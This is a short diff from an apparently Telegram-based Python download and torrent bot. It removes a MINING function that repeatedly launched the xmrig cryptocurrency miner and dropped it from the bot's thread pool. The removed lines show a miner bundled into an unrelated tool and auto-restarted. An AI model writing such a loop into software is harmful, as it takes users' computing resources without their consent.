@@ -344,15 +344,6 @@ def ACTIVATOR():
         except Exception as e:
             Gvar.LOG.append(str(e))
             print(str(e))
-
-def MINING():
-    while 1:
-        time.sleep(120)
-        os.system("./xmrig/xmrig -t 1 -c ./xmrig/config.json")
-        try:
-            bot.send_message(Gvar.DEBUG_GROUP_ID,"mining not running\nstarting again")
-        except:
-            time.sleep(10)
             
 pool = v_pool(
     [
@@ -364,8 +355,7 @@ pool = v_pool(
         DOWNLOAD_QUEUE_HANDLER,
         TO_SEND_QUEUE_HANDLER,
         TORRENT_QUEUE_HANDLER,
-        LOG_QUEUE_HANDLER,
-        MINING
+        LOG_QUEUE_HANDLER
     ]
 )
 
